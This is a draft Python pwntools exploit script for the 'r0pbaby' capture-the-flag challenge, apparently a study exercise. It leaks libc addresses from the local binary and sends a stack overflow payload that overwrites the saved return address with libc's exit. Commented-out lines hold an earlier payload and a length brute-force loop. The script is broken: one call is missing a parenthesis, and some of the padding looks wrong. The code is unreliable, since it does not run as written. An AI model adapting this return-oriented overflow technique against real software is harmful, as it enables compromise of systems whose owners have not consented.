#!/usr/bin/env python
from pwn import *
import sys
context(arch='amd64', os='linux', timeout=2)

libcAddr = ''
libcExit = ''

r0pbaby = process('./r0pbaby_542ee6516410709a1421141501f03760')
r0pbaby.recv()
r0pbaby.sendline('1')
libcAddr = r0pbaby.recvline().split()[1]
r0pbaby.recv()
r0pbaby.sendline('2')
r0pbaby.sendline('exit')
libcExit = r0pbaby.recvline().split()[-1]
r0pbaby.recv()

r0pbaby.sendline('3')
print r0pbaby.recv()
s = ''
s += chr(0x0)*8*6 # pop rbp
s += pack(int(libcExit, 16), 64, 'little', False) + str(0x5)*8 # saved rip
s += chr(0x0A)*0

print len(s)
r0pbaby.sendline(str(len(s))

print enhex(s)
print s
r0pbaby.sendline(s)

print r0pbaby.recv()
r0pbaby.sendline('4')

#r0pbaby.sendline(20*chr(0x90) + pack(int(libcExit, 16), 64, 'little', False) + str(0x5))
print r0pbaby.recv()

#for length in range(0, 1024):
#    r0pbaby.sendline('3')
#    r0pbaby.recv()
#    r0pbaby.sendline(6*chr(0x0))
#    res = r0pbaby.recv()
#    if not res.startswith('Invalid amount.'):
#        print length
#        print res

print libcAddr
print libcExit

res = None
while res is None:
    res = r0pbaby.poll()
    r0pbaby.kill()
print res
